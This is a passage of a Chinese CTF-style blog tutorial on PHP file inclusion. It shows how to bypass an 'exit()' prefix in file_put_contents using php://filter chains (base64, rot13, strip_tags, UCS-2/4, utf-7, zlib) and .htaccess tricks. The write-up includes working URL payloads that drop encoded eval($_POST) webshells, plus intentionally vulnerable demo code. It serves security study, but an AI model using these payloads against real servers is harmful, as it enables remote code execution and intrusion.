+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#x27;r&#x27;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里其他不看，单纯来看 <code>(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)</code> 直接传 $user&#x3D;”welcome xxx” 肯定是不现实的，因为这里是以文件的形式打开，所以我们这里可以尝试 ?user&#x3D;php:&#x2F;&#x2F;input 然后post数据 welcome to the bugkuctf 即可，post的内容即会被识别为文件内容。</p>
+<h2 id="file-put-content-伪协议"><a href="#file-put-content-伪协议" class="headerlink" title="file_put_content+伪协议"></a>file_put_content+伪协议</h2><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>file_put_contents 结合伪协议来写马，有着很多很骚的操作，其本质也是大同小异，就是利用过滤器编码来做一些操作。关于file_put_contents结合伪协议的考察，之前也遇到过，一直没有做个总结，现总结如下：</p>
+<h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"> <span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="利用base64"><a href="#利用base64" class="headerlink" title="利用base64"></a>利用base64</h4><p>这个之前在P牛的文章里面有提到过。原文章链接:</p>
+<p><code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></p>
+<p>base64是每4个字符进行编码，这里的 php exit 一共 7个字符，我们需要手动添上一个字符，剩下的就是我们可控代码了。</p>
+<p><code>?filename=php://filter/write/convert.base64-decode/resource=1.php&amp;content=XPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs=</code>  (这里的X是手动添加为了和前面凑8个</p>
+<p><img src="https://i.loli.net/2020/12/02/rXbgw1MVu6jyHKx.png" alt="111.png"></p>
+<h4 id="利用rot13"><a href="#利用rot13" class="headerlink" title="利用rot13"></a>利用rot13</h4><p>一个在线rot13编码解码的网站：</p>
+<p><a target="_blank" rel="noopener" href="http://www.mxcz.net/tools/rot13.aspx">http://www.mxcz.net/tools/rot13.aspx</a></p>
+<p><code>?filename=php://filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG[&#39;pzq&#39;]);</code></p>
+<p><img src="https://i.loli.net/2020/12/02/tUKJwqIxC61O7s4.png" alt="112.png"></p>
+<p>可以发现成功写入shell，但是有个局限，如果开启了<strong>php短标签</strong>，这个就无效了。就会报错。</p>
+<h4 id="利用string-strip-tags结合-htaccess"><a href="#利用string-strip-tags结合-htaccess" class="headerlink" title="利用string.strip_tags结合.htaccess"></a>利用string.strip_tags结合.htaccess</h4><p>这个可以过滤掉PHP HTML标签  <code>&lt;?php ?&gt;</code> 中内容是可以直接吃完的。</p>
+<p>如果是Apache服务器，我们可以配合<code>.htaccess</code>文件来包含文件:</p>
+<p><code>filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=&gt;php_value%20auto_prepend_file%20D:\phpStudy\PHPTutorial\WWW\flag.php</code></p>
+<p>可以看到成功写入：</p>
+<p><img src="https://i.loli.net/2020/12/02/kBcJiREuFwdAKS3.png" alt="113.png"></p>
+<p>然后访问：</p>
+<p><img src="https://i.loli.net/2020/12/02/UTnmcHASvVEfZqg.png" alt="115.png"></p>
+<p>该方法适用：</p>
+<ul>
+<li>PHP5版本可以，PHP7不行，7.3版本已废除这个标签</li>
+<li>apache环境</li>
+<li>文件名以及路径已知</li>
+</ul>
+<h4 id="过滤器编码组合"><a href="#过滤器编码组合" class="headerlink" title="过滤器编码组合"></a>过滤器编码组合</h4><p>顾名思义，就是利用过滤器的<strong>嵌套</strong>，来实现我们的目的。</p>
+<p>还是针对demo1的代码进行测试：</p>
+<p>我们传入 <code>?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=4.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
+<p><img src="https://i.loli.net/2020/12/03/Aqis5nurS2KY9kI.png" alt="1.png"></p>
+<p>可以看到成功写入。</p>
+<p>不过因为  <code>string.strip_tags</code>的原因，这个方法在PHP7版本还是会有局限性，但是在PHP5环境下是适用的。</p>
+<p>另一种方式，针对PHP7环境下：</p>
+<p><code>filename=php://filter/write=zlib.deflate|string.tolower|zlib.inflate/resource=5.php&amp;content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=5.php</code>  </p>
+<p>压缩、转小写、解压，消去死亡exit，成功带入我们的 webshell</p>
+<p><img src="https://i.loli.net/2020/12/03/opFIQ86Nwlgsfzc.png" alt="2.png"></p>
+<p>再来看看demo2 ~</p>
+<h3 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个相较于demo1区别是，同一变量。</p>
+<h4 id="利用base64-1"><a href="#利用base64-1" class="headerlink" title="利用base64"></a>利用base64</h4><p>一开始还是想到使用base64编码：</p>
+<p><code>?content=php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+</code> 拼接后内容就是</p>
+<p><code>&lt;?php exit();php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+</code> 但是没有成功，因为’&#x3D;’在base64编码中代表结束，所以等号后面还接上字母，会报错，转码不出来。</p>
+<p>所以这里可以结合 <code>string.strip_tags</code> 来去掉等号：</p>
+<p><code>?content=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php</code></p>
+<p>在windows下，这种文件名的存在是很怪异的，但是在linux下测试是可行的：</p>
+<p><img src="https://i.loli.net/2020/12/03/nm3TNrAQzf5bOEM.png" alt="3.png"></p>
+<p>当然这个方式还是针对于PHP5</p>
+<p><code>?content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=7.php</code></p>
+<p>这里我们传过去可以看到：</p>
+<p><img src="https://i.loli.net/2020/12/03/mKYV2hBXDQvZrgJ.png" alt="4.png"></p>
+<p>访问 7.php文件，可以看到 phpinfo文件，同理我们可以构造shell</p>
+<h4 id="利用rot13-1"><a href="#利用rot13-1" class="headerlink" title="利用rot13"></a>利用rot13</h4><p>这里我们依然可以利用rot13，<code>?content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=8.php</code> </p>
+<p><img src="https://i.loli.net/2020/12/04/HZ4ScB3Nv81otGu.png" alt="1233.png"></p>
+<p>可以发现，用rot13成功写入，不过仍然存在短标签的问题。</p>
+<h4 id="利用usc-2"><a href="#利用usc-2" class="headerlink" title="利用usc-2"></a>利用usc-2</h4><p>通过usc-2编码，两位一反转。</p>
+<p><code>?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp%20pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=9.php</code></p>
+<p><img src="https://i.loli.net/2020/12/04/P8xZ2qKNeO9Qwob.png" alt="12.png"></p>
+<p>可以看到成功写入，并且将前面的死亡代码糅杂消失。</p>
+<h4 id="利用usc-4"><a href="#利用usc-4" class="headerlink" title="利用usc-4"></a>利用usc-4</h4><p>和usc-2原理基本一致，不过这里是四位一反转。</p>
+<p><code>?content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=10.php</code></p>
+<h4 id="utf-8、utf-7转换"><a href="#utf-8、utf-7转换" class="headerlink" title="utf-8、utf-7转换"></a>utf-8、utf-7转换</h4><p>测试发现：</p>
+<p><img src="https://i.loli.net/2020/12/04/FZmGyCQb5MfnAvO.png" alt="13.png"></p>
+<p>等号经过<code>utf-7</code>编码后会变成 +AD0- ，这样就可以消除等号的影响。并且：</p>
+<p><img src="https://i.loli.net/2020/12/04/uWVSQyApnEH58hF.png" alt="14.png"></p>
+<p>纯字符经过 <code>utf-7</code> 编码 ，和原来不会有太大区别，所以可以结合 utf7和base64解码来写马</p>
+<p><code>?content=php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=10.php</code></p>
+<p>本地可以看到已经成功写入：</p>
+<p><img src="https://i.loli.net/2020/12/06/CYKxaU7HFZM2diz.png" alt="123.png"></p>
+<h3 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"> <span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span> . <span class="string">&quot;\nxxxxxx&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其实可以直接写 <code>?content=&lt;?php phpinfo();?&gt;</code> 但其实题目一般都会有过滤，可能是过滤掉 起始符号 &lt;? ，这个时候我们可以利用 <code>.htaccess</code></p>
+<p>但是 <code>.htaccess</code> 文件，对内容要求很严格，多余冗杂的代码会导致文件失效和错误。所以我们考虑注释符。</p>
+<p>s1mple师傅的payload:</p>
+<p><code>?filename=.htaccess&amp;content=php_value%20auto_prepend_file%20D:\phpStudy\PHPTutorial\WWW\flag.php%0a%23\</code></p>
+<p>成功写入：</p>
+<p><img src="https://i.loli.net/2020/12/14/A8D5xlp3oUiqg47.png" alt="123.png"></p>
+<p>这里我们以文本形式打开的时候，可以看到换行仍然进行了，xxxx到了第三行，但是 .htaccess在实际解析生效的时候 \n会被注释掉，然后会在同一排，所以成功包含。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>https://xz.aliyun.com/t/8163#toc-2</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/11/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="命令执行">
+                  <i class="fa fa-angle-left"></i> 命令执行
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next" title="文件上传">
+                  文件上传 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
